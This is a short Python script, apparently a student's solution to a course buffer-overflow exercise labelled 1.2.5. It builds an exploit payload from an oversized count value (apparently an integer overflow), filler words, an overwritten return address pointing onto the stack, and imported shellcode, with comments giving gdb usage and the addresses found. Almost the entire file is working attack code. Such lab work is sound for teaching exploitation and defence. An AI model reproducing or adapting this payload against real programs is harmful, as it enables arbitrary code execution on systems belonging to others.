#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#gdb --args ./1.2.5 tmp $(python3 1.2.5.py > tmp)
#return address 080489b8
#return address location fffed93c
sys.stdout.buffer.write(pack("<I", 0x40000005))
for i in range(11):
	sys.stdout.buffer.write(pack("<I", 0x11111111))
sys.stdout.buffer.write(pack("<I", 0xfffed940))
sys.stdout.buffer.write(shellcode)

#for i in range(1073741824)
